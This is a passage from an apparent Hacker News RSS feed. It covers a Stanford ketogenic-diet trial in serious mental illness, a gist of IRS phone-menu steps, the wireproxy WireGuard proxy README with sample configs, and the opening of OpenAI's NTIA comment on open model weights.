    <p>In the four-month pilot trial, Sethi’s team followed 21 adult participants who were diagnosed with schizophrenia or bipolar disorder, taking antipsychotic medications, and had a metabolic abnormality — such as weight gain, insulin resistance, hypertriglyceridemia, dyslipidemia or impaired glucose tolerance. The participants were instructed to follow a ketogenic diet, with approximately 10% of the calories from carbohydrates, 30% from protein and 60% from fat. They were not told to count calories.</p>
<p>“The focus of eating is on whole non-processed foods including protein and non-starchy vegetables, and not restricting fats,” said Sethi, who shared keto-friendly meal ideas with the participants. They were also given keto cookbooks and access to a health coach.&nbsp;<br>
</p>
<p>The research team tracked how well the participants followed the diet through weekly measures of blood ketone levels. (Ketones are acids produced when the body breaks down fat — instead of glucose — for energy.) By the end of the trial, 14 patients had been fully adherent, six were semi-adherent and only one was non-adherent.</p>
<p>The participants underwent a variety of psychiatric and metabolic assessments throughout the trial.</p>
<p>Before the trial, 29% of the participants met the criteria for metabolic syndrome, defined as having at least three of five conditions: abdominal obesity, elevated triglycerides, low HDL cholesterol, elevated blood pressure and elevated fasting glucose levels. After four months on a ketogenic diet, none of the participants had metabolic syndrome.</p>
<p>On average, the participants lost 10% of their body weight; reduced their waist circumference by 11% percent; and had lower blood pressure, body mass index, triglycerides, blood sugar levels and insulin resistance.</p>
<p>“We’re seeing huge changes,” Sethi said. “Even if you’re on antipsychotic drugs, we can still reverse the obesity, the metabolic syndrome, the insulin resistance. I think that’s very encouraging for patients.”</p>
<blockquote><span>The participants reported improvements in their energy, sleep, mood and quality of life.</span></blockquote>
<p><span>The psychiatric benefits were also striking. On average, the participants improved 31% on a psychiatrist rating of mental illness known as the clinical global impressions scale, with three-quarters of the group showing clinically meaningful improvement. Overall, the participants also reported better sleep and greater life satisfaction.</span><br>
</p>
<p>“The participants reported improvements in their energy, sleep, mood and quality of life,” Sethi said. “They feel healthier and more hopeful.”</p>
<p>The researchers were impressed that most of the participants stuck with the diet. “We saw more benefit with the adherent group compared with the semi-adherent group, indicating a potential dose-response relationship,” Sethi said.</p>
<h3>Alternative fuel for the brain</h3>
<p>There is increasing evidence that psychiatric diseases such as schizophrenia and bipolar disorder stem from metabolic deficits in the brain, which affect the excitability of neurons, Sethi said.</p>
<p>The researchers hypothesize that just as a ketogenic diet improves the rest of the body’s metabolism, it also improves the brain’s metabolism.</p>
<p>“Anything that improves metabolic health in general is probably going to improve brain health anyway,” Sethi said. “But the ketogenic diet can provide ketones as an alternative fuel to glucose for a brain with energy dysfunction.”</p>
<p>Likely there are multiple mechanisms at work, she added, and the main purpose of the small pilot trial is to help researchers detect signals that will guide the design of larger, more robust studies. &nbsp;</p>
<p>As a physician, Sethi cares for many patients with both serious mental illness and obesity or metabolic syndrome, but few studies have focused on this undertreated population.</p>
<p>She is the founder and director of the <a href="https://med.stanford.edu/psychiatry/patient_care/metabolic.html">metabolic psychiatry clinic</a> at Stanford Medicine.</p>
<p>“Many of my patients suffer from both illnesses, so my desire was to see if metabolic interventions could help them,” she said. “They are seeking more help. They are looking to just feel better.”</p>
<p>Researchers from the University of Michigan; the University of California, San Francisco; and Duke University contributed to the study.</p>
<p>The study was supported by Baszucki Group Research Fund, Keun Lau Fund and the Obesity Treatment Foundation.</p>

</div>

</div>


    <div>






<ul>











<li>
    
    <div>
        
            <p>
                Nina Bai is a science writer in the Office of Communications. Email her at nina.bai@stanford.edu.
            </p>
        
    </div>
</li></ul>
</div>


    
  	  

      
    
      <p>About Stanford Medicine</p>
      <p><a href="https://med.stanford.edu/">Stanford Medicine</a> is an integrated academic health system comprising the <a href="https://med.stanford.edu/school.html">Stanford School of Medicine</a> and adult and pediatric health care delivery systems. Together, they harness the full potential of biomedicine through collaborative research, education and clinical care for patients. For more information, please visit <a href="https://med.stanford.edu/">med.stanford.edu</a>.</p>
    

  </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Get a person at the IRS (112 pts)]]></title>
            <link>https://gist.github.com/getaaron/323466af3f489f0e5c55411c930d43a2</link>
            <guid>39900422</guid>
            <pubDate>Mon, 01 Apr 2024 23:03:29 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://gist.github.com/getaaron/323466af3f489f0e5c55411c930d43a2">https://gist.github.com/getaaron/323466af3f489f0e5c55411c930d43a2</a>, See on <a href="https://news.ycombinator.com/item?id=39900422">Hacker News</a></p>
<div id="readability-page-1" class="page"><div itemscope="" itemtype="http://schema.org/Code" data-commit-hovercards-enabled="" data-discussion-hovercards-enabled="" data-issue-and-pr-hovercards-enabled="">
    <main id="gist-pjax-container">
      

  


<div>
    
  

<div>
  <div>
      <p><a data-hovercard-type="user" data-hovercard-url="/users/getaaron/hovercard" data-octo-click="hovercard-link-click" data-octo-dimensions="link_type:self" href="https://gist.github.com/getaaron"><img src="https://avatars.githubusercontent.com/u/789577?s=64&amp;v=4" width="32" height="32" alt="@getaaron"></a>
      </p>
      
    </div>
  <ul>



      <li>
          <a id="gist-star-button-count" href="https://gist.github.com/login?return_to=https%3A%2F%2Fgist.github.com%2Fgetaaron%2F323466af3f489f0e5c55411c930d43a2" rel="nofollow" data-hydro-click="{&quot;event_type&quot;:&quot;authentication.click&quot;,&quot;payload&quot;:{&quot;location_in_page&quot;:&quot;gist star button&quot;,&quot;repository_id&quot;:null,&quot;auth_type&quot;:&quot;LOG_IN&quot;,&quot;originating_url&quot;:&quot;https://gist.github.com/getaaron/323466af3f489f0e5c55411c930d43a2&quot;,&quot;user_id&quot;:null}}" data-hydro-click-hmac="7c4b66004aac08a9a7fe6110d9bc30da63a1581fa9a04df2fc065fd5da780349" data-view-component="true">  <span>
      <span>
        
      </span>
    <span>Star</span>
      <span>
        <span title="57" data-view-component="true">57</span>
      </span>
  </span>
</a><tool-tip id="tooltip-db48e2a1-c551-4cc6-afde-98f443f502e7" for="gist-star-button-count" popover="manual" data-direction="n" data-type="description" data-view-component="true">You must be signed in to star a gist</tool-tip>

      </li>

        <li>
            <a id="gist-fork-button" href="https://gist.github.com/login?return_to=https%3A%2F%2Fgist.github.com%2Fgetaaron%2F323466af3f489f0e5c55411c930d43a2" rel="nofollow" data-hydro-click="{&quot;event_type&quot;:&quot;authentication.click&quot;,&quot;payload&quot;:{&quot;location_in_page&quot;:&quot;gist fork button&quot;,&quot;repository_id&quot;:null,&quot;auth_type&quot;:&quot;LOG_IN&quot;,&quot;originating_url&quot;:&quot;https://gist.github.com/getaaron/323466af3f489f0e5c55411c930d43a2&quot;,&quot;user_id&quot;:null}}" data-hydro-click-hmac="c8b9f6a078523cc03fd33ceaacf3a0db4ed2573cb63d8ebf27dbc786c7d4fc08" data-view-component="true">  <span>
      <span>
        
      </span>
    <span>Fork</span>
      <span>
        <span title="2" data-view-component="true">2</span>
      </span>
  </span>
</a><tool-tip id="tooltip-e69d522e-e215-49b2-baf4-5d2530382f3c" for="gist-fork-button" popover="manual" data-direction="n" data-type="description" data-view-component="true">You must be signed in to fork a gist</tool-tip>

        </li>
  </ul>
</div>

  <div>
      <p><a id="gist-star-button-no-count" href="https://gist.github.com/login?return_to=https%3A%2F%2Fgist.github.com%2Fgetaaron%2F323466af3f489f0e5c55411c930d43a2" rel="nofollow" data-hydro-click="{&quot;event_type&quot;:&quot;authentication.click&quot;,&quot;payload&quot;:{&quot;location_in_page&quot;:&quot;gist star button&quot;,&quot;repository_id&quot;:null,&quot;auth_type&quot;:&quot;LOG_IN&quot;,&quot;originating_url&quot;:&quot;https://gist.github.com/getaaron/323466af3f489f0e5c55411c930d43a2&quot;,&quot;user_id&quot;:null}}" data-hydro-click-hmac="7c4b66004aac08a9a7fe6110d9bc30da63a1581fa9a04df2fc065fd5da780349" data-view-component="true">  <span>
      <span>
        
      </span>
    <span>Star</span>
  </span>
</a></p><tool-tip id="tooltip-a0b4a36f-ee01-45e1-bab7-305bb29352fe" for="gist-star-button-no-count" popover="manual" data-direction="n" data-type="description" data-view-component="true">You must be signed in to star a gist</tool-tip>

  </div>

<div data-multiple="">

    <div data-view-component="true">
  <action-menu data-menu-input="gist-share-url" data-select-variant="single" data-dynamic-label="" data-view-component="true">
  <focus-group direction="vertical" mnemonics="" retain="">
    


<anchored-position id="action-menu-19219f8b-406b-4e3c-aa42-66c47144e4a2-overlay" anchor="action-menu-19219f8b-406b-4e3c-aa42-66c47144e4a2-button" side="outside-bottom" anchor-offset="normal" popover="auto" data-view-component="true">
  </anchored-position>  </focus-group>
</action-menu>    <primer-text-field>
      <label for="gist-share-url">
        Clone this repository at &amp;lt;script src=&amp;quot;https://gist.github.com/getaaron/323466af3f489f0e5c55411c930d43a2.js&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;
</label>    
  
      
    
</primer-text-field>
  <clipboard-copy id="clipboard-button" aria-label="Copy" for="gist-share-url" data-hydro-click="{&quot;event_type&quot;:&quot;clone_or_download.click&quot;,&quot;payload&quot;:{&quot;feature_clicked&quot;:&quot;COPY_URL&quot;,&quot;git_repository_type&quot;:&quot;GIST&quot;,&quot;gist_id&quot;:129407888,&quot;originating_url&quot;:&quot;https://gist.github.com/getaaron/323466af3f489f0e5c55411c930d43a2&quot;,&quot;user_id&quot;:null}}" data-hydro-click-hmac="524d29db5b54e881b9a2abbfd019d4812f26bbedcecf5f4450d2f4f57c95818a" type="button" data-view-component="true">
    
    
</clipboard-copy>

</div>

      <tool-tip id="tooltip-5f75bddd-19b1-420f-bc24-ed66b6084c79" for="icon-button-2960a459-7c8e-4053-93ab-7e950eb41f00" popover="manual" data-direction="s" data-type="label" data-view-component="true">Save getaaron/323466af3f489f0e5c55411c930d43a2 to your computer and use it in GitHub Desktop.</tool-tip>



    
  </div>


  </div>

<div>
      <p>
    Get a person at the IRS
  </p>

        <div id="file-irs-get-human-md">
    <article itemprop="text"><ul dir="auto">
<li>Call 1-800-829-1040</li>
<li>Press 1 for English (or other language as desired)</li>
<li>Press 2 for personal tax</li>
<li>Press 1 for form / tax history</li>
<li>Press 3 for other</li>
<li>Press 2 for other</li>
<li>Ignore 2 SSN prompts till you get secret other menu</li>
<li>Press 2 for personal tax</li>
<li>Press 3 for other</li>
<li>Wait for agent!</li>
</ul>
</article>
  </div>


      
</div><!-- /.container -->

    </main>
  </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Wireproxy: WireGuard client that exposes itself as a HTTP/SOCKS5 proxy (309 pts)]]></title>
            <link>https://github.com/pufferffish/wireproxy</link>
            <guid>39900329</guid>
            <pubDate>Mon, 01 Apr 2024 22:51:29 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://github.com/pufferffish/wireproxy">https://github.com/pufferffish/wireproxy</a>, See on <a href="https://news.ycombinator.com/item?id=39900329">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-hpc="true"><article itemprop="text"><p dir="auto"><h2 tabindex="-1" dir="auto">wireproxy</h2><a id="user-content-wireproxy" aria-label="Permalink: wireproxy" href="#wireproxy"></a></p>
<p dir="auto"><a href="https://github.com/pufferffish/wireproxy/blob/master/LICENSE"><img src="https://camo.githubusercontent.com/c1d96069f24e1aa70192e61e304e8d766ca0c851bd14ed06b5eab62ddeb80d67/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f6c6963656e73652d4953432d626c7565" alt="ISC licensed" data-canonical-src="https://img.shields.io/badge/license-ISC-blue"></a>
<a href="https://github.com/octeep/wireproxy/actions"><img src="https://github.com/octeep/wireproxy/actions/workflows/build.yml/badge.svg" alt="Build status"></a>
<a href="https://pkg.go.dev/github.com/octeep/wireproxy" rel="nofollow"><img src="https://camo.githubusercontent.com/43df7d0d15a1b0fef6fab238d3f53d13da1bfff6a2a1c9cb606899aa52b8d875/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f676f646f632d7769726570726f78792d626c7565" alt="Documentation" data-canonical-src="https://img.shields.io/badge/godoc-wireproxy-blue"></a></p>
<p dir="auto">A wireguard client that exposes itself as a socks5/http proxy or tunnels.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">What is this</h2><a id="user-content-what-is-this" aria-label="Permalink: What is this" href="#what-is-this"></a></p>
<p dir="auto"><code>wireproxy</code> is a completely userspace application that connects to a wireguard peer,
and exposes a socks5/http proxy or tunnels on the machine. This can be useful if you need
to connect to certain sites via a wireguard peer, but can't be bothered to setup a new network
interface for whatever reasons.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Why you might want this</h2><a id="user-content-why-you-might-want-this" aria-label="Permalink: Why you might want this" href="#why-you-might-want-this"></a></p>
<ul dir="auto">
<li>You simply want to use wireguard as a way to proxy some traffic.</li>
<li>You don't want root permission just to change wireguard settings.</li>
</ul>
<p dir="auto">Currently, I'm running wireproxy connected to a wireguard server in another country,
and configured my browser to use wireproxy for certain sites. It's pretty useful since
wireproxy is completely isolated from my network interfaces, and I don't need root to configure
anything.</p>
<p dir="auto">Users who want something similar but for Amnezia VPN can use <a href="https://github.com/juev/wireproxy/tree/feature/amnezia-go">this fork</a>
of wireproxy by <a href="https://github.com/juev">@juev</a>.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Feature</h2><a id="user-content-feature" aria-label="Permalink: Feature" href="#feature"></a></p>
<ul dir="auto">
<li>TCP static routing for client and server</li>
<li>SOCKS5/HTTP proxy (currently only CONNECT is supported)</li>
</ul>
<p dir="auto"><h2 tabindex="-1" dir="auto">TODO</h2><a id="user-content-todo" aria-label="Permalink: TODO" href="#todo"></a></p>
<ul dir="auto">
<li>UDP Support in SOCKS5</li>
<li>UDP static routing</li>
</ul>
<p dir="auto"><h2 tabindex="-1" dir="auto">Usage</h2><a id="user-content-usage" aria-label="Permalink: Usage" href="#usage"></a></p>
<div data-snippet-clipboard-copy-content="./wireproxy -c [path to config]"><pre><code>./wireproxy -c [path to config]
</code></pre></div>
<div data-snippet-clipboard-copy-content="usage: wireproxy [-h|--help] [-c|--config &quot;<value>&quot;] [-s|--silent]
                 [-d|--daemon] [-v|--version] [-n|--configtest]

                 Userspace wireguard client for proxying

Arguments:

  -h  --help        Print help information
  -c  --config      Path of configuration file
  -s  --silent      Silent mode
  -d  --daemon      Make wireproxy run in background
  -v  --version     Print version
  -n  --configtest  Configtest mode. Only check the configuration file for
                    validity."><pre><code>usage: wireproxy [-h|--help] [-c|--config "&lt;value&gt;"] [-s|--silent]
                 [-d|--daemon] [-v|--version] [-n|--configtest]

                 Userspace wireguard client for proxying

Arguments:

  -h  --help        Print help information
  -c  --config      Path of configuration file
  -s  --silent      Silent mode
  -d  --daemon      Make wireproxy run in background
  -v  --version     Print version
  -n  --configtest  Configtest mode. Only check the configuration file for
                    validity.
</code></pre></div>
<p dir="auto"><h2 tabindex="-1" dir="auto">Build instruction</h2><a id="user-content-build-instruction" aria-label="Permalink: Build instruction" href="#build-instruction"></a></p>
<div data-snippet-clipboard-copy-content="git clone https://github.com/octeep/wireproxy
cd wireproxy
make"><pre><code>git clone https://github.com/octeep/wireproxy
cd wireproxy
make
</code></pre></div>
<p dir="auto"><h2 tabindex="-1" dir="auto">Use with VPN</h2><a id="user-content-use-with-vpn" aria-label="Permalink: Use with VPN" href="#use-with-vpn"></a></p>
<p dir="auto">Instructions for using wireproxy with Firefox container tabs and auto-start on MacOS can be found <a href="https://github.com/pufferffish/wireproxy/blob/master/UseWithVPN.md">here</a>.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Sample config file</h2><a id="user-content-sample-config-file" aria-label="Permalink: Sample config file" href="#sample-config-file"></a></p>
<div data-snippet-clipboard-copy-content="# The [Interface] and [Peer] configurations follow the same semantics and meaning
# of a wg-quick configuration. To understand what these fields mean, please refer to:
# https://wiki.archlinux.org/title/WireGuard#Persistent_configuration
# https://www.wireguard.com/#simple-network-interface
[Interface]
Address = 10.200.200.2/32 # The subnet should be /32 and /128 for IPv4 and v6 respectively
# MTU = 1420 (optional)
PrivateKey = uCTIK+56CPyCvwJxmU5dBfuyJvPuSXAq1FzHdnIxe1Q=
DNS = 10.200.200.1

[Peer]
PublicKey = QP+A67Z2UBrMgvNIdHv8gPel5URWNLS4B3ZQ2hQIZlg=
# PresharedKey = UItQuvLsyh50ucXHfjF0bbR4IIpVBd74lwKc8uIPXXs= (optional)
Endpoint = my.ddns.example.com:51820
# PersistentKeepalive = 25 (optional)

# TCPClientTunnel is a tunnel listening on your machine,
# and it forwards any TCP traffic received to the specified target via wireguard.
# Flow:
# <an app on your LAN> --> localhost:25565 --(wireguard)--> play.cubecraft.net:25565
[TCPClientTunnel]
BindAddress = 127.0.0.1:25565
Target = play.cubecraft.net:25565

# TCPServerTunnel is a tunnel listening on wireguard,
# and it forwards any TCP traffic received to the specified target via local network.
# Flow:
# <an app on your wireguard network> --(wireguard)--> 172.16.31.2:3422 --> localhost:25545
[TCPServerTunnel]
ListenPort = 3422
Target = localhost:25545

# STDIOTunnel is a tunnel connecting the standard input and output of the wireproxy
# process to the specified TCP target via wireguard.
# This is especially useful to use wireproxy as a ProxyCommand parameter in openssh
# For example:
#    ssh -o ProxyCommand='wireproxy -c myconfig.conf' ssh.myserver.net
# Flow:
# Piped command -->(wireguard)--> ssh.myserver.net:22
[STDIOTunnel]
Target = ssh.myserver.net:22

# Socks5 creates a socks5 proxy on your LAN, and all traffic would be routed via wireguard.
[Socks5]
BindAddress = 127.0.0.1:25344

# Socks5 authentication parameters, specifying username and password enables
# proxy authentication.
#Username = ...
# Avoid using spaces in the password field
#Password = ...

# http creates a http proxy on your LAN, and all traffic would be routed via wireguard.
[http]
BindAddress = 127.0.0.1:25345

# HTTP authentication parameters, specifying username and password enables
# proxy authentication.
#Username = ...
# Avoid using spaces in the password field
#Password = ..."><pre><code># The [Interface] and [Peer] configurations follow the same semantics and meaning
# of a wg-quick configuration. To understand what these fields mean, please refer to:
# https://wiki.archlinux.org/title/WireGuard#Persistent_configuration
# https://www.wireguard.com/#simple-network-interface
[Interface]
Address = 10.200.200.2/32 # The subnet should be /32 and /128 for IPv4 and v6 respectively
# MTU = 1420 (optional)
PrivateKey = uCTIK+56CPyCvwJxmU5dBfuyJvPuSXAq1FzHdnIxe1Q=
DNS = 10.200.200.1

[Peer]
PublicKey = QP+A67Z2UBrMgvNIdHv8gPel5URWNLS4B3ZQ2hQIZlg=
# PresharedKey = UItQuvLsyh50ucXHfjF0bbR4IIpVBd74lwKc8uIPXXs= (optional)
Endpoint = my.ddns.example.com:51820
# PersistentKeepalive = 25 (optional)

# TCPClientTunnel is a tunnel listening on your machine,
# and it forwards any TCP traffic received to the specified target via wireguard.
# Flow:
# &lt;an app on your LAN&gt; --&gt; localhost:25565 --(wireguard)--&gt; play.cubecraft.net:25565
[TCPClientTunnel]
BindAddress = 127.0.0.1:25565
Target = play.cubecraft.net:25565

# TCPServerTunnel is a tunnel listening on wireguard,
# and it forwards any TCP traffic received to the specified target via local network.
# Flow:
# &lt;an app on your wireguard network&gt; --(wireguard)--&gt; 172.16.31.2:3422 --&gt; localhost:25545
[TCPServerTunnel]
ListenPort = 3422
Target = localhost:25545

# STDIOTunnel is a tunnel connecting the standard input and output of the wireproxy
# process to the specified TCP target via wireguard.
# This is especially useful to use wireproxy as a ProxyCommand parameter in openssh
# For example:
#    ssh -o ProxyCommand='wireproxy -c myconfig.conf' ssh.myserver.net
# Flow:
# Piped command --&gt;(wireguard)--&gt; ssh.myserver.net:22
[STDIOTunnel]
Target = ssh.myserver.net:22

# Socks5 creates a socks5 proxy on your LAN, and all traffic would be routed via wireguard.
[Socks5]
BindAddress = 127.0.0.1:25344

# Socks5 authentication parameters, specifying username and password enables
# proxy authentication.
#Username = ...
# Avoid using spaces in the password field
#Password = ...

# http creates a http proxy on your LAN, and all traffic would be routed via wireguard.
[http]
BindAddress = 127.0.0.1:25345

# HTTP authentication parameters, specifying username and password enables
# proxy authentication.
#Username = ...
# Avoid using spaces in the password field
#Password = ...
</code></pre></div>
<p dir="auto">Alternatively, if you already have a wireguard config, you can import it in the
wireproxy config file like this:</p>
<div data-snippet-clipboard-copy-content="WGConfig = <path to the wireguard config>

# Same semantics as above
[TCPClientTunnel]
...

[TCPServerTunnel]
...

[Socks5]
..."><pre><code>WGConfig = &lt;path to the wireguard config&gt;

# Same semantics as above
[TCPClientTunnel]
...

[TCPServerTunnel]
...

[Socks5]
...
</code></pre></div>
<p dir="auto">Having multiple peers is also supported. <code>AllowedIPs</code> would need to be specified
such that wireproxy would know which peer to forward to.</p>
<div data-snippet-clipboard-copy-content="[Interface]
Address = 10.254.254.40/32
PrivateKey = XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX=

[Peer]
Endpoint = 192.168.0.204:51820
PublicKey = YYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY=
AllowedIPs = 10.254.254.100/32
PersistentKeepalive = 25

[Peer]
PublicKey = ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ=
AllowedIPs = 10.254.254.1/32, fdee:1337:c000:d00d::1/128
Endpoint = 172.16.0.185:44044
PersistentKeepalive = 25


[TCPServerTunnel]
ListenPort = 5000
Target = service-one.servicenet:5000

[TCPServerTunnel]
ListenPort = 5001
Target = service-two.servicenet:5001

[TCPServerTunnel]
ListenPort = 5080
Target = service-three.servicenet:80"><pre><code>[Interface]
Address = 10.254.254.40/32
PrivateKey = XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX=

[Peer]
Endpoint = 192.168.0.204:51820
PublicKey = YYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY=
AllowedIPs = 10.254.254.100/32
PersistentKeepalive = 25

[Peer]
PublicKey = ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ=
AllowedIPs = 10.254.254.1/32, fdee:1337:c000:d00d::1/128
Endpoint = 172.16.0.185:44044
PersistentKeepalive = 25


[TCPServerTunnel]
ListenPort = 5000
Target = service-one.servicenet:5000

[TCPServerTunnel]
ListenPort = 5001
Target = service-two.servicenet:5001

[TCPServerTunnel]
ListenPort = 5080
Target = service-three.servicenet:80
</code></pre></div>
<p dir="auto">Wireproxy can also allow peers to connect to it:</p>
<div data-snippet-clipboard-copy-content="[Interface]
ListenPort = 5400
...

[Peer]
PublicKey = YYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY=
AllowedIPs = 10.254.254.100/32
# Note there is no Endpoint defined here."><pre><code>[Interface]
ListenPort = 5400
...

[Peer]
PublicKey = YYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY=
AllowedIPs = 10.254.254.100/32
# Note there is no Endpoint defined here.
</code></pre></div>
<p dir="auto"><h2 tabindex="-1" dir="auto">Stargazers over time</h2><a id="user-content-stargazers-over-time" aria-label="Permalink: Stargazers over time" href="#stargazers-over-time"></a></p>
<p dir="auto"><a href="https://starchart.cc/octeep/wireproxy" rel="nofollow"><img src="https://camo.githubusercontent.com/5c075afba2908eac3fe1330be304f1beca6c1b3d924cf55f5c06b95e876d961a/68747470733a2f2f7374617263686172742e63632f6f63746565702f7769726570726f78792e737667" alt="Stargazers over time" data-canonical-src="https://starchart.cc/octeep/wireproxy.svg"></a></p>
</article></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[OpenAI's comment to the NTIA on open model weights (105 pts)]]></title>
            <link>https://openai.com/global-affairs/openai-s-comment-to-the-ntia-on-open-model-weights</link>
            <guid>39900197</guid>
            <pubDate>Mon, 01 Apr 2024 22:35:23 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://openai.com/global-affairs/openai-s-comment-to-the-ntia-on-open-model-weights">https://openai.com/global-affairs/openai-s-comment-to-the-ntia-on-open-model-weights</a>, See on <a href="https://news.ycombinator.com/item?id=39900197">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="content"><!--[--><!--[--><div id="there-are-many-paths-to-safe-and-beneficial-ai" data-heading=""><p><h2>There are many paths to safe and beneficial AI.</h2></p></div><!--]--><!--[--><div><p>OpenAI <a href="https://openletter.svangel.com/" rel="noopener noreferrer" target="_blank">believes</a> that building, broadly deploying, and using AI can improve people’s lives and unlock a better future. Progress relies on innovation and free market competition. Within those broad guidelines, there are many different paths by which people can further the promise of AI. OpenAI was among the first AI developers to wrestle with the question of how to distribute the benefits of unprecedentedly-capable foundation models, and we start by providing this historical context to help inform the NTIA’s deliberations.</p><p>In 2019, we created GPT-2, which had the new capability of generating coherent paragraphs of text, and were faced with the question of how to deploy it. On the one hand, the model seemed very useful; on the other hand, <a href="https://openai.com/research/better-language-models" rel="noopener noreferrer" target="_blank">we weren’t sure</a> if it could be useful for malicious purposes such as phishing email generation. We opted to experiment with a “staged release”. As we <a href="https://openai.com/research/better-language-models" rel="noopener noreferrer" target="_blank">wrote</a> at the time, “staged release involves the gradual release of a family of models over time. The purpose of our staged release of GPT-2 is to give people time to assess the properties of these models, discuss their societal implications, and evaluate the impacts of release after each stage.” When we did not observe significant misuse effects, this gave us the confidence to openly <a href="https://openai.com/research/gpt-2-1-5b-release" rel="noopener noreferrer" target="_blank">release the full model</a> weights.</p><p>In 2020, we created GPT-3, which was much more capable than any previous language model on every benchmark, and again faced the question of how to release it. This time, we decided to release it via our first product, the OpenAI API (an Application Programming Interface, which allows developers to build apps on our technology). As we <a href="https://openai.com/blog/openai-api" rel="noopener noreferrer" target="_blank">wrote</a> at the time, we had several motivations for this new release strategy: “commercializing the technology helps us pay for our ongoing AI research, safety, and policy efforts” and “the API model allows us to more easily respond to misuse of the technology. Since it is hard to predict the downstream use cases of our models, it feels inherently safer to release them via an API and broaden access over time, rather than release an open source model where access cannot be adjusted if it turns out to have harmful applications.” Over several years, this API release taught us and the community <a href="https://openai.com/research/language-model-safety-and-misuse" rel="noopener noreferrer" target="_blank">lessons about the safety and misuse patterns of GPT-3 level models</a>.</p><p>In the years since, we have continued to support and believe in the promise of the open-source AI ecosystem, including by openly releasing the weights of some of our state-of-the-art models (such as CLIP and Whisper) and developing open-source infrastructure for other AI developers (such as the Triton GPU programming language). We have seen openly released weights bring a variety of significant benefits, including facilitating academic research on the internals of AI models, enabling users and organizations to run models locally on their edge devices, and facilitating creative modifications of models to suit users’ ends. Many AI companies have chosen to invest heavily in open model weight releases for a variety of reasons, including brand, recruiting, and attracting a developer ecosystem to build on and accelerate the internals of a company’s technology.</p><p>At the same time, our approach to releasing our flagship AI models via APIs and commercial products like ChatGPT has enabled us to continue studying and mitigating risks that we discovered after initial release, often in ways that would not have been possible had the weights themselves been released. For example, we recently partnered with Microsoft to <a href="https://openai.com/blog/disrupting-malicious-uses-of-ai-by-state-affiliated-threat-actors" rel="noopener noreferrer" target="_blank">detect, study, and disrupt</a> the operations of a number of nation-state cyber threat actors who were abusing our GPT-3.5-Turbo and GPT-4 models to assist in cyberoffensive operations. Disrupting these threat actors would not have been possible if the weights of these at-the-time frontier models had been released widely, as the same cyber threat actors could have hosted the model on their own hardware, never interacting with the original developer. This approach has enabled us to continue to distribute the benefits of AI broadly, including via widely-available free and low-cost services.</p><p>These experiences have convinced us that both open weights releases and API and product-based releases are tools for achieving beneficial AI, and we believe the best American AI ecosystem will include both.<br></p></div><!--]--><!--[--><div id="combining-iterative-deployment-with-a-preparedness-framework" data-heading=""><p><h2>Combining iterative deployment with a Preparedness Framework</h2></p></div><!--]--><!--[--><div><p>Over and over again, across both product releases and weight releases, we have seen the incredible benefits of “iterative deployment”: gradually putting increasingly capable AI into people’s hands so they can use it to improve their lives, and helping society adjust to these new technologies. As we <a href="https://openai.com/blog/our-approach-to-ai-safety" rel="noopener noreferrer" target="_blank">wrote</a> in 2023: “We work hard to prevent foreseeable risks before deployment, however, there is a limit to what we can learn in a lab. Despite extensive research and testing, we cannot predict all of the beneficial ways people will use our technology, nor all the ways people will abuse it. That’s why we believe that learning from real-world use is a critical component of creating and releasing increasingly safe AI systems over time.”</p><p>As AI models become even more powerful and the benefits and risks of their deployment or release become greater, it is also important that we be increasingly sophisticated in deciding whether and how to deploy a model. This is particularly true if AI capabilities come to have significant implications for public safety or national security. The future presence of such “catastrophic” risks from more advanced AI systems is inherently uncertain, and there is scholarly disagreement on how likely and how soon such risks will arise. We do not believe there is yet sufficient evidence; we can’t rule them out, nor be certain they’re imminent. As developers advancing the frontier of AI capabilities to maximize their benefits, we view building the science of the risks of this technology (including gathering evidence related to those risks) as integral to our work.</p><p>To navigate these uncertainties in an empirically driven manner, OpenAI publicly launched our <a href="https://cdn.openai.com/openai-preparedness-framework-beta.pdf" rel="noopener noreferrer" target="_blank">Preparedness Framework</a>, a science-based approach to continuously assess and mitigate any catastrophic risks that might be posed by our AI models. The Preparedness Framework defines how we evaluate our AI models’ capability levels in several high-risk domains, including cybersecurity, autonomous operation, individualized persuasion, and CBRN (Chemical, Biological, Radiological, and Nuclear) threats. For an example of this framework in action, see our <a href="https://openai.com/research/building-an-early-warning-system-for-llm-aided-biological-threat-creation" rel="noopener noreferrer" target="_blank">recent study</a> testing GPT-4’s ability to aid in biological threat creation, which concluded that it poses no significant marginal risk.</p><p>Based on these evaluations, we assess models’ risk levels in each category as Low, Medium, High, or Critical. Crucially, under our Preparedness Framework, we will not deploy AI systems that pose a risk level of “High” or “Critical” in our taxonomy (and will not even train “Critical” ones, given their level of risk), unless our mitigations can bring these systems’ risk down to at most a “Medium” level. The Preparedness Framework is important because it lets us build and widely share the benefits of increasingly capable AI, while preparing us to detect and protect against catastrophic risks as early as possible if they do arise.<br></p></div><!--]--><!--[--><div id="practices-for-developers-of-highly-capable-ai" data-heading=""><p><h2>Practices for developers of highly capable AI</h2></p></div><!--]--><!--[--><div><p>We believe that people and companies should be able to participate in AI as they choose —which can include developing or using AI that reflects their values and vision —in order to achieve the benefits of AI. At the same time, highly capable AI systems should be built and used safely, with any discovered catastrophic risks appropriately mitigated. 